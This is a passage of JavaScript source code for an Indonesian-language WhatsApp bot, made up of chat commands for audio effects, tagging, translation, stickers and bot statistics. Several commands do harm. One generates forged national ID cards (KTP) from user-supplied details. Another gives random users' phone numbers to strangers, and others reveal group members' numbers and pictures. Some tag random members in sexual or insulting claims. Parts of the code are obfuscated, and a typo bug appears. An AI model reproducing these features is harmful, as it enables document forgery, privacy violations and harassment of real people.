ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
uhh = fs.readFileSync(ran)
YANZ.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek,duration:999999999999})
fs.unlinkSync(ran)
})
	 } catch (e) {	
	reply(mess.error)
	}  
limitAdd(sender, limit)
break
      case 'fast':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)

try {
	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await YANZ.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -filter:a "atempo=1.3,asetrate=43000" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
YANZ.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
	})
	} catch (e) {	
	reply(mess.error)
	}  
	limitAdd(sender, limit)
break
case 'robot':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)

	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await YANZ.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
YANZ.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(ran)
	})
limitAdd(sender, limit)
break
case 'detikvn':
case 'setdetikvn':
case 'setdurasi':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
if (!Number(args[0])) return reply(`EXAMPLE : ${prefix + command} 50`)
  reply(mess.wait)
	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await YANZ.downloadAndSaveMediaMessage(encmedia)
	cokmatane = Number(args[0])
	hah = fs.readFileSync(media)
YANZ.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted: mek})
fs.unlinkSync(media)
limitAdd(sender, limit)
break
case 'tupai':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)

try {
	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await YANZ.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
YANZ.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek,duration:99})
fs.unlinkSync(ran)
})
 } catch (e) {	
	reply(mess.error)
	}  	
limitAdd(sender, limit)
break
case 'vibra':
case 'vibrato':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await YANZ.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=16" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
YANZ.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(ran)
	})
limitAdd(sender, limit)
limitAdd(sender, limit)
break
case 'tinyurl':{
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (args.length < 1) return reply(`LINKNYA?`)
if (!isUrl) return reply ('Link?')
const fetchText = (url, optiono) => {
return new Promise((resolve, reject) => {
return fetch(url, optiono)
.then(response => response.text())
.then(text => resolve(text))
.catch(err => {
console.log(color(err,'red'))
reject(err)
})
})
}
okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
shorti = `*RESULT : ${okok}*`
reply(shorti)
}
break
case 'infoall': case 'tagall':
if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
if (isBan) return reply(mess.ban)
var nom = mek.participant
members_id = []
teks = ''
for (let mem of groupMembers) {
teks += `│ *@${mem.jid.split('@')[0]}*\n`
members_id.push(mem.jid)
}
mentions(`━━ *TAG ALL* ━━
${q?`\nPesan : `+q:``}
⬡
${teks}⬡`, members_id, true)
break
case 'hidetag': case 'ht':
   if (isBan) return reply(mess.ban)
  if (!isPrem && !mek.key.fromMe) return reply(mess.only.prem)
   if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
   hideTag(from, `${q}`) 
   } else {  
   quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
   hideTag(from, `${quotedText}`)
   }
   break
case 'kalkulator':
case 'kalku':{
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
reply(`${Math_js.evaluate(q.replace("×","*").replace("x","*").replace("X","*").replace("÷","/").replace(":","/").replace("kali","*").replace("bagi","/").replace("tambah","+").replace("tamba","+").replace("kurang","-").replace("kurangi","-"))}`)
} else {
reply(`${Math_js.evaluate(mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation)}`)
}
}
break
case 'tts': case 'say':
try {
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (args.length > 50) return reply('```ERROR, TEKS TERLALU PANJANG!```')
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
const gtts = require('./lib/gtts')(args[0])
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 50
? reply('```ERROR, TEKS TERLALU PANJANG!```')
: gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
YANZ.sendMessage(from, buff, audio, {quoted: mek, ptt:true})
fs.unlinkSync(rano)
})
})
} else {
const gtts = require('./lib/gtts')(args[0]?args[0]:'id')
dtt = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 50
? reply('```ERROR, TEKS TERLALU PANJANG!```')
: gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
YANZ.sendMessage(from, buff, audio, {quoted: mek, ptt:true})
fs.unlinkSync(rano)
})
})
}
} catch (e) {
reply(`${e}`)
}
limitAdd(sender, limit)
break
case 'translate':
case 'terjemah':
try {
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (args.length < 1)return reply(`Usage : #translate kode bahasa teks/reply pesan\nExample : #translate id why`)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
translate(`${body.slice(10+args[0].length+1)}`, args[0])
.then((res) => { reply(`${res}`) })
} else {
tolang = args[0]
entah = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
translate(entah, tolang)
.then((res) => { reply(`${res}`) })
}
} catch (e) {
reply(`${e}`)
}
break
case 'ingfokanbot':
case 'stats':
case 'infobot':{
try {
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
let totalchat = await YANZ.chats.all()
let i = []
let giid = []
for (let mem of totalchat){
i.push(mem.jid)
}
for (let id of i){
if (id && id.includes('g.us')){
giid.push(id)
}
}
const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = YANZ.user.phone
nunie = nomerowner + '@s.whatsapp.net'
teks = `───── 「 *INFO BOT* 」 ─────

${f} *NAMA BOT :* ${namabot}
${f} *OWNER :* @${nunie.split("@")[0]}
${f} *PREFIX :* ${nopref?'No prefix':multiprefix?'Multi prefix':prefix}
${f} *RUNTIME :* ${kyun(process.uptime())}
${f} *SPEED :* ${processsTime(mek.messageTimestamp.low, moment())}s
${f} *STATUS :* ${public?`Public Mode`:`Self Mode`}
${f} *TOTAL HIT :* ${totalhit}
${f} *BROWSER* : ${YANZ.browserDescription}
${f} *BATERAI :* ${battre}% ${baterai.cas === 'true' ? 'Di cas' : 'Ga di cas'}

${f} *ANTI DELETE KONTAK :* ${isCtRevoke?`Aktif`:`Mati`}
${f} *AUTO UPDATE BIO :* ${autoupdatebio?`Aktif`:`Mati`}

${f} *TOTAL PERSONAL CHAT :* ${totalchat.length - giid.length}
${f} *TOTAL GROUP CHAT :* ${giid.length}
${f} *TOTAL CHAT :* ${totalchat.length}
${f} *TOTAL USER :* ${_user.length}
${f} *TOTAL BLOCK :* ${blocked.length}
${f} *TOTAL BANED :* ${ban.length}
${f} *TOTAL BANED ANTIDELETE :* ${dataBanCtRevoke.length}

Subscribe : Herman Chanel

─ 「 *TQ TO* 」 ─
${f} *FARID*
${f} *ADITYA*
${f} *ALDI FAUZI*
${f} *SENKU ARD*
${f} *PENYEDIA API*
${f} *MHANKBARBAR*`
let mhan = await YANZ.prepareMessage('0@s.whatsapp.net', gambar, MessageType.image, {})
mhan.message.imageMessage.jpegThumbnail = gambar2
mhan.message.imageMessage.fileLength = (String(9)).repeat(8)
let gbutsan = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: '👑 OWNER' }, type: 1 },
{ buttonId: `${prefix}snk`, buttonText: { displayText: '⚠️ SNK' }, type: 1 }]
function _0x38cc(){const _0x4d6b60=['270576UpjOFA','sendMessage','3593471auwJRw','241241EBrISP','639gZGaIH','426610onHgmT','imageMessage','2IjUhGe','169370xpqbHC','message','2889780uQGIio','635427izSLre','buttonsMessage','8fwWtVh'];_0x38cc=function(){return _0x4d6b60;};return _0x38cc();}const _0x2f0c89=_0x40e5;function _0x40e5(_0x424b7b,_0x435c3c){const _0x38cc30=_0x38cc();return _0x40e5=function(_0x40e5aa,_0x540864){_0x40e5aa=_0x40e5aa-0xd0;let _0x483357=_0x38cc30[_0x40e5aa];return _0x483357;},_0x40e5(_0x424b7b,_0x435c3c);}(function(_0xb73a0a,_0x54a718){const _0x132038=_0x40e5,_0x3d6404=_0xb73a0a();while(!![]){try{const _0xb6f9b1=parseInt(_0x132038(0xdd))/0x1+-parseInt(_0x132038(0xd3))/0x2*(-parseInt(_0x132038(0xd7))/0x3)+-parseInt(_0x132038(0xd6))/0x4+-parseInt(_0x132038(0xd1))/0x5+parseInt(_0x132038(0xda))/0x6+-parseInt(_0x132038(0xdc))/0x7*(parseInt(_0x132038(0xd9))/0x8)+-parseInt(_0x132038(0xd0))/0x9*(-parseInt(_0x132038(0xd4))/0xa);if(_0xb6f9b1===_0x54a718)break;else _0x3d6404['push'](_0x3d6404['shift']());}catch(_0x440c9b){_0x3d6404['push'](_0x3d6404['shift']());}}}(_0x38cc,0x5caa1));let gbuttonan={'locationMessage':{'degressLongitude':0x0,'degressLatitude':0x1,'address':'a','jpegThumbnail':gambar2},'imageMessage':mhan[_0x2f0c89(0xd5)][_0x2f0c89(0xd2)],'contentText':''+teks,'footerText':''+tampilTanggal,'buttons':gbutsan,'headerType':0x6};await YANZ[_0x2f0c89(0xdb)](from,gbuttonan,MessageType[_0x2f0c89(0xd8)],{'contextInfo':{'externalAdReply':{},'mentionedJid':[nunie],'forwardingScore':0x989680,'isForwarded':!![]},'quoted':mek});
} catch (e){
reply(`${e}`)
}
}
break
case 'credits': case 'credit': case 'thanksto':
function _0x1b26(_0x46c5a0,_0x1e8d98){var _0x4b6b00=_0x4b6b();return _0x1b26=function(_0x1b26a2,_0x3f9882){_0x1b26a2=_0x1b26a2-0xb2;var _0x28b93f=_0x4b6b00[_0x1b26a2];return _0x28b93f;},_0x1b26(_0x46c5a0,_0x1e8d98);}var _0x45533f=_0x1b26;(function(_0xbf0d02,_0x22f161){var _0x50f0b9=_0x1b26,_0x412251=_0xbf0d02();while(!![]){try{var _0x4d42b3=-parseInt(_0x50f0b9(0xbb))/0x1*(-parseInt(_0x50f0b9(0xbf))/0x2)+parseInt(_0x50f0b9(0xba))/0x3+-parseInt(_0x50f0b9(0xb4))/0x4*(-parseInt(_0x50f0b9(0xb2))/0x5)+-parseInt(_0x50f0b9(0xbe))/0x6+-parseInt(_0x50f0b9(0xc2))/0x7*(parseInt(_0x50f0b9(0xb9))/0x8)+parseInt(_0x50f0b9(0xc3))/0x9*(parseInt(_0x50f0b9(0xb3))/0xa)+-parseInt(_0x50f0b9(0xc1))/0xb*(parseInt(_0x50f0b9(0xb5))/0xc);if(_0x4d42b3===_0x22f161)break;else _0x412251['push'](_0x412251['shift']());}catch(_0xe1db4c){_0x412251['push'](_0x412251['shift']());}}}(_0x4b6b,0x5d911),reply(_0x45533f(0xc0)+f+_0x45533f(0xb7)+f+_0x45533f(0xbc)+f+'\x20*ALDI\x20FAUZI\x20@6285697725326*\x0a'+f+_0x45533f(0xbd)+f+_0x45533f(0xb6)+f+_0x45533f(0xb8)));function _0x4b6b(){var _0x16eef5=['1311245RLlzcc','10CtleJJ','4tsjvqO','12vheAIO','\x20*PENYEDIA\x20API*\x0a','\x20*FARID\x20@6281231951590*\x0a','\x20*MHANKBARBAR*','296PCovqr','1018239eypuDh','185184RqjSVa','\x20*ADITYA\x20@6282189387018*\x0a','\x20*SENKU\x20ARD\x20@undefined*\x0a','2497476FjXIct','8dMLPrL','─\x20「\x20*TQ\x20TO*\x20」\x20─\x0a','4823137IhayBO','135443OoWOFJ','5503293GNQuQu'];_0x4b6b=function(){return _0x16eef5;};return _0x4b6b();}
break
case 'mutual':
case 'cariteman':{
if (isBan) return reply(mess.ban)
if (!isPrem) return reply(mess.only.prem)
if (isGroup) return reply('Only Personal Chat')
hem = getUserrRandomId(_user).replace('@s.whatsapp.net','')
reply('Tunggu Sebentar, Sedang Mencari Seseorang...')
try {
ppimg = await YANZ.getProfilePicture(`${hem.split('@')[0]}@c.us`)
} catch {
ppimg = `${imagebb}`
}

teks = `Seseorang Telah Di Temukan, Semoga Cocok :v

*Nomor : ${hem.split("@")[0]}*
*Api : wa.me/${hem.split("@")[0]}*`
gh = await getBuffer(ppimg)
    const gambra = await YANZ.prepareMessage(from, gh, MessageType.image, {thumbnail: gambar})
    const buttonsss = [{buttonId:`${prefix}mutual`,buttonText: {displayText: '➡️ NEXT ➡️'}, type: 1}]
    const ButtonsMessages = {
    contentText: teks,
    buttons: buttonsss,
    footerText: `BOT CREATED BY FARID`,
    headerType: 4,
    imageMessage: gambra.message.imageMessage
    }
  await YANZ.sendMessage(from, ButtonsMessages, MessageType.buttonsMessage, {contextInfo :{text: 'Hai',
  "forwardingScore": 1000000000,
  isForwarded: false,
  sendEphemeral: false,
  "externalAdReply": {
  "title": `Untuk Memulai Obrolan`,
  "body": `Klik Di Sini`,
  "previewType": "PHOTO",
  "thumbnailUrl": imagebbthumb,
  "thumbnail": imagebbthumb,
  "sourceUrl": `https://wa.me/${hem.split("@")[0]}?text=Hai`
  }, mentionedJid:[hem]}, quoted : mek})
  }
  break
  case 'clearall':{
  if (!isOwner && !mek.key.fromMe) return
  let chiit = await YANZ.chats.all()
  for (let i of chiit){
  YANZ.modifyChat(i.jid, 'clear', {
  includeStarred: false
  })
  }
  reply(`Succes..`)
  }
  break
case 'tes': case 'test': case 'ping':{
if (isBan) return
replybutton(from, `${prefix}menu`, `Runtime : ${kyun(process.uptime())}\nSpeed : ${processsTime(mek.messageTimestamp.low, moment())}s\nKlik Menu Untuk Menampilkan Menu Bot`, `𝐌 𝐄 𝐍 𝐔`, `*AKTIF SLOERRRRR!!!!*`)
}
break
case 'cekapikey':
if (!isOwner && !mek.key.fromMe) return
anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${lolkey}`)
teks = `─「 *APIKEY CEK* 」─\n\n➸ *USSERNAME :* ${anu.result.username}\n➸ *REQUEST :* ${anu.result.requests}\n➸ *TODAY :* ${anu.result.today}\n➸ *AKUN TYPE :* ${anu.result.account_type}\n➸ *EXPIRED :* ${anu.result.expired}`
YANZ.sendMessage(`${ownerNumber}`, teks, text, {quoted: mek})
break
 case 'nulis':
 case 'tulis':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
  if (args.length < 1) return reply('Yang mau di tulis apaan?')
  teks = args.join(' ')
  reply(mess.wait)
  nulis = encodeURIComponent(teks)
  res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
  if (res.data.error) return reply(res.data.error)
  buff = Buffer.from(res.data.result.split(',')[1], 'base64')
  YANZ.sendMessage(from, buff, image, {quoted: mek, caption: 'Jangan Males!!'})
  limitAdd(sender, limit)
  break
case 'getpic':
case 'getpp':
case 'getprofile':
case 'getpick':{
if (!isGroup) return reply(mess.only.group)
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
reply(mess.wait)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
try {
pp = await YANZ.getProfilePicture(mentioned)
} catch {
pp = `${imagebb}`
}
buffer = await getBuffer(pp)
YANZ.sendMessage(from, buffer, image, {quoted: mek, caption: `*Profile Picture Of @${mentioned.split("@")[0]}*`, thumbnail:gambar2, contextInfo:{mentionedJid:[mentioned]}})
}
break  
case 'getno':
case 'getnomor':
if (!isGroup) return reply(mess.only.group)
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('REPLY PESAN TARGET!!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
reply(`${mentioned.split('@')[0]}`)
break
case 'towame': case 'towa.me':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
if (mek.message.extendedTextMessage != undefined){
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
reply(`wa.me/`+mentioned.split("@")[0])
} else {
reply(`${prefix+command} @tag atau reply`)
}
break
case 'wame': case 'wa.me':
if (!isUser) return reply(mess.noregis)
if (isBan) return reply(mess.ban)
wamo = q.replace(new RegExp("[()/ ]", "gi"), "+")
reply(q?`wa.me/`+sender.split("@")[0]+'?text='+wamo: `wa.me/`+sender.split("@")[0])
break

  case 'sendkontak': case 'kontak':
  if (isBan) return reply(mess.ban)
  if (!isPrem && !mek.key.fromMe) return reply(mess.only.prem)
  if (mek.message.extendedTextMessage != undefined){
  mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
  const ynkos = 'BEGIN:VCARD\n' 
  + 'VERSION:3.0\n' 
  + `FN:${q?q:`KONTAK`}\n`
  + `ORG:KONTAK;\n`
  + `TEL;type=CELL;type=VOICE;waid=${mentioned.split("@")[0]}:+${mentioned.split("@")[0]}\n`
  + 'END:VCARD'
  YANZ.sendMessage(from, {displayname: "Jeff", vcard: ynkos}, MessageType.contact, { quoted: mek})
  } else {
  const ynkos = 'BEGIN:VCARD\n' 
  + 'VERSION:3.0\n' 
  + `FN:${q.split('|')[1]}\n`
  + `ORG:KONTAK;\n`
  + `TEL;type=CELL;type=VOICE;waid=${q.split('|')[0]}:+${q.split('|')[0]}\n`
  + 'END:VCARD'
  YANZ.sendMessage(from, {displayname: "Jeff", vcard: ynkos}, MessageType.contact, { quoted: mek})
  }
  break    
  
   case 'notif':
   if (!isUser) return reply(mess.noregis)
   if (isBan) return reply(mess.ban)
   if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
   teks = `NOTIF DARI @${sender.split("@")[0]}\n*PESAN : ${body.slice(7)}*`
   group = await YANZ.groupMetadata(from);
   member = group['participants']
   jids = [];
   member.map(async adm => {
   jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
   })
   options = {
   text: teks,
   contextInfo: {
   mentionedJid: jids
   },
   quoted: mek
   }
   await YANZ.sendMessage(from, options, text)
   limitAdd(sender, limit)
   break
   case 'ktpmaker':
   case 'createktp':
   case 'buatktp':
   if (!isUser) return reply(mess.noregis)
   if (isBan) return reply(mess.ban)
   if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
   if (args.length == 0) return reply(`◯ USAGE : ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\n────────────\n\n◯ EXAMPLE : ${prefix + command} 6281231951590|bumipertiwi|fatamorgana|MUZZA BOT|mars, 99-99-9999|belum ditemukan|jl sukarno|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/QbCC3Q7/0438dd9a28d2.jpg\n\n*NOTE : UNTUK MENJADIKAN GAMBAR ATAU IMAGE MENJADI URL BISA DENGAN CARA REPLY GAMBAR ATAU KIRIM GAMBAR DENGAN CAPTION ${prefix}imgtourl*`)
   reply(mess.wait)  
   get_args = args.join(" ").split("|")
   nik = get_args[0]
   prov = get_args[1]
   kabu = get_args[2]
   name = get_args[3]
   ttl = get_args[4]
   jk = get_args[5]
   jl = get_args[6]
   rtrw = get_args[7]
   lurah = get_args[8]
   camat = get_args[9]
   agama = get_args[10]
   nikah = get_args[11]
   kerja = get_args[12]
   warga = get_args[13]
   until = get_args[14]
   img = get_args[15]
   ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ktpmaker?apikey=${lolkey}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
   YANZ.sendMessage(from, ini_buffer, image, {caption: 'KTPNYA DAH JADI KAK', quoted: mek })
   limitAdd(sender, limit)
  break

case 'addvn':
case 'addaudio':
case 'addmp3':
case 'addmusic':
if (!mek.key.fromMe && !isPrem) return reply(mess.only.prem)
if (!isQuotedAudio) return reply('Reply Audionya!!')
if (!q) return reply('Nama audionyaaa? >_<')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await YANZ.downloadMediaMessage(boij)
fs.writeFileSync(`./database/audio/${q}.mp3`, delb)
addVn(`${q}`)
reply(`Sukses Menambahkan Audio!!\nCek Audio Dengan Cara Ketik ${prefix}listvn`)
break
case 'addstik':
case 'addseticker':
case 'adds':
case 'addstiker':
case 'addsticker':
case 'addsetiker':
if (!mek.key.fromMe && !isPrem) return reply(mess.only.prem)
if (!isQuotedSticker) return reply('Reply stiker nya')
if (!q) return reply('Nama sticker nya apa?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await YANZ.downloadMediaMessage(boij)
fs.writeFileSync(`./database/stick/${q}.webp`, delb)
addStc(`${q}`)
reply(`Sukses Menambahkan Sticker!!\nCek Sticker Dengan Cara Ketik ${prefix}liststick`)
break
case 'dellstik':
case 'dellstick':
case 'dellsticker':
case 'dellstiker':
if (!mek.key.fromMe && !isPrem) return reply(mess.only.prem)
if (!q) return reply(`NAMA STICKER MANA YANG MAU DI HAPUS?`)
try {
fs.unlinkSync(`./database/stick/${q}.webp`)
dellStc(`${q}`)
reply(`Succes Menghapus sticker ${q}!`)
await sleep(5000)
} catch (err) {
reply(`Gagal Menghapus sticker ${q}!`)
}
break
case 'dellaudio':
case 'dellvn':
case 'dellmp3':
case 'dellmusic':
if (!mek.key.fromMe && !isPrem) return reply(mess.only.prem)
if (!q) return reply(`NAMA AUDIO MANA YANG MAU DI HAPUS?`)
try {
fs.unlinkSync(`./database/audio/${q}.mp3`)
dellVn(`${q}`)
reply(`Succes Menghapus Audio ${q}!`)
await sleep(5000)
} catch (err) {
console.log(err)
reply(`Gagal Menghapus Audio ${q}!`)
}
break
case 'liststik':
case 'liststicker':
case 'liststiker':
case 'liststick':
 if (!isUser) return reply(mess.noregis)
 if (isBan) return reply(mess.ban)
 YANZ.updatePresence(from, Presence.avaible) 
 teks = '*「 LIST STICKER 」*\n\n'
 for (let awokwkwk of setiker) {
 teks += `${f} ${awokwkwk}\n`
 }
 teks += `\n*TOTAL :* ${setiker.length}`
 reply(`${teks}`)
 break
 case 'listvn':
 case 'vnlist':
 case 'listaudio':
 if (!isUser) return reply(mess.noregis)
 if (isBan) return reply(mess.ban)
 YANZ.updatePresence(from, Presence.avaible) 
 teks = '*「 LIST AUDIO 」*\n\n'
 for (let awokwkwk of audionye) {
 teks += `${f} ${awokwkwk}\n`
 }
 teks += `\n*TOTAL :* ${audionye.length}`
 reply(`${teks}`)
 break
case 'sider': case 'getsider':
if (isBan) return
reply(`mungkin yang kamu maksud #chatinfo ?
ketik #chatinfo dengan mereply pesan bot`)
breal
 case 'chatinfo':{
 if (!isUser) return reply(mess.noregis)
 if (isBan) return reply(mess.ban)
 if (!isGroup) return reply('Hanya bisa didalam grup')
 infom = await YANZ.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
 hemm = infom.reads
  hemms = infom.deliveries
  readon = hemms.map(v => v.jid)
  readdin = hemm.map(v => v.jid)
  stamp = hemm.map(v => v.t)
  function toTime(UNIXtimestamp, ribuan) {
    ribuan = (typeof ribuan == 'undefined') ? false : true;

    let a = new Date(UNIXtimestamp);
    if (ribuan) {
      a = new Date(UNIXtimestamp * 1000);
    }
    var hour = a.getHours();
    var min = a.getMinutes();
    var sec = a.getSeconds();
    var time = `${hour}:${min}:${sec}`;
    return time;
  }

  function toBulan(UNIXtimestamp, ribuan) {
    ribuan = (typeof ribuan == 'undefined') ? false : true;

    let a = new Date(UNIXtimestamp);
    if (ribuan) {
      a = new Date(UNIXtimestamp * 1000);
    }
    var months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember'];
    var myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum at', 'Sabtu'];
    var day = a.getDate()
    bulanee = a.getMonth()
    var thisDay = a.getDay(),
      thisDay = myDays[thisDay];
    var yy = a.getYear()
    var year = (yy < 1000) ? yy + 1900 : yy;
    var bul = `${thisDay}, ${day} - ${months[bulanee]} - ${year}`;
    return bul;
  }
  teksx = `「 *TELAH DIBACA* 」\n\n`
  for (let i of hemm) {
    teksx += `${f} Nama : @${i.jid.split('@')[0]}\n${f} Waktu : ${toTime(i.t, true)}\n${f} Tanggal : ${toBulan(i.t, true)}\n\n`
  }
  teksx1 = `「 *BELUM DIBACA* 」\n\n`
  for (let i of hemms) {
    teksx1 += `${f} Nama : @${i.jid.split('@')[0]}\n`
    teksx1 += `${f} Waktu : ${toTime(i.t, true)}\n${f} Tanggal : ${toBulan(i.t, true)}\n\n`
  }
  YANZ.sendMessage(from, teksx, text, { sendEphemeral: false, quoted: mek, thumbnail: gambar3, contextInfo: { forwardingScore: 999, isForwarded: false, mentionedJid: readdin } })
  YANZ.sendMessage(from, teksx1, text, { sendEphemeral: false, quoted: mek, thumbnail: gambar3, contextInfo: { forwardingScore: 999, isForwarded: false, mentionedJid: readon } })
}
break
case 'ngentod':
case 'ngewe':
 if (!isUser) return reply(mess.noregis)
 if (isBan) return reply(mess.ban)
 if (!isGroup) return reply(`GROUP ONLY`)
jds = []
const jdiid = groupMembers
const kosst = groupMembers
const hpoo = ['4','5','6','7','8','9'] 
const kontrod = ['sungai','pohon kelapa','jalan raya','sawah','pantai','selokan','bawah jembatan']
dimanaha = kontrod[Math.floor(Math.random() * (kontrod.length))] 
ahahahu = hpoo[Math.floor(Math.random() * (hpoo.length))] 
const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
const diaat = kosst[Math.floor(Math.random() * kosst.length)]
teks = `Yang ${command} kemarin di grub ini adalah\n@${akuut.jid.split('@')[0]} dan @${diaat.jid.split('@')[0]} \nDia Ngewe Sampe ${ahahahu} Kali di ${dimanaha}`
jds.push(akuut.jid)
jds.push(diaat.jid)
mentions(teks, jds, true)
break
case 'ganteng': case 'cantik': case 'jelek': case 'goblok':  
case 'bego': case 'pinter': case 'jago': case 'nolep': case 'monyet':    	 
case 'babi': case 'beban': case 'baik': case 'jahat': case 'anjing': 
case 'haram': case 'kontol': case 'pakboy': case 'pakgirl': case 'memek':
case 'wibu': case 'hebat': case 'sadboy': case 'sadgirl': case 'tollol':    	   	       
if (!isUser) return
if (isBan) return
if (!isGroup) return 
 jds = []
const A1 = groupMembers
const B1 = groupMembers
const C1 = A1[Math.floor(Math.random() * A1.length)]
D1 = `di grup ini yang *ter${command}* adalah si @${C1.jid.split('@')[0]}`     
jds.push(C1.jid)
mentions(D1, jds, true)
break
case 'jadian':	       
 if (!isUser) return reply(mess.noregis)
